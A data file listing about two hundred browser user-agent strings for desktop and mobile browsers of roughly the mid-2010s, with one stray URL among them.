Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP08; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-T210R Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.18.US Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SM-T350 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0; 1ButtonTaskbar)
Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG-SM-G920A Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MAAU; MAAU; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.1
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MANM; MANM; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; QTAQZ3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 OverDrive Media Console/3.3.1
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Mobile/11D257
Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/7.0.55539 Mobile/11D201 Safari/9537.53
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4
Mozilla/5.0 (Windows NT 5.1; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (iPad;U;CPU OS 5_1_1 like Mac OS X; zh-cn)AppleWebKit/534.46.0(KHTML, like Gecko)CriOS/19.0.1084.60 Mobile/9B206 Safari/7534.48.3
Mozilla/5.0 (Linux; Android 4.4.3; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/11D201 Safari/9537.53
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAMIJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; VS985 4G Build/LRX21Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 5.1; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020b Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.3; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; WOW64; Trident/6.0)
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; MS-RTC LM 8)
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/32.0
Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (Linux; Android 4.2.2; SM-T110 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910T Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/7.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36
Mozilla/5.0 (X11; CrOS armv7l 6946.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0 SeaMonkey/2.35
http://www.useragentstring.com/Firefox25.0_id_19710.php
Mozilla/5.0 (Linux; Android 4.4.2; SM-T330NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A8426 Safari/8536.25
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; LG-V410 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 TheWorld 6
Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12B410 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0 Safari/600.1.25
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; EIE10;ENUSWOL)
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; ATT; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; EIE10;ENUSMSN; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MATBJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LGMS323 Build/KOT49I.MS32310c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE11;ENUSMSN; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:29.0) Gecko/20100101 Firefox/29.0
Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/537.36 (KHTML, like Gecko)  Chrome/30.0.1599.114 Safari/537.36 Puffin/4.5.0IT
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie8; rv:11.0) like Gecko
Mozilla/5.0 (Linux; U; Android 4.4.3; en-gb; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; FunWebProducts; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2505.0 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; Touch; WebView/1.0)
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SPH-L720 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; yie9; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (compatible; Windows NT 6.1; Catchpoint) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; Z970 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10
Mozilla/5.0 (X11; CrOS armv7l 6812.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.153 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; )
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASAJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 BIDUBrowser/7.6 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MASMJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; Trident/7.0; Touch; rv:11.0) like Gecko
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; 360SE)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.3; .NET4.0C; .NET4.0E; MS-RTC LM 8)
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAGWJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G925T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4.17.9 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/5.0 (Linux; Android 4.2.2; GT-P5113 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0 DejaClick/2.5.0.11
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER
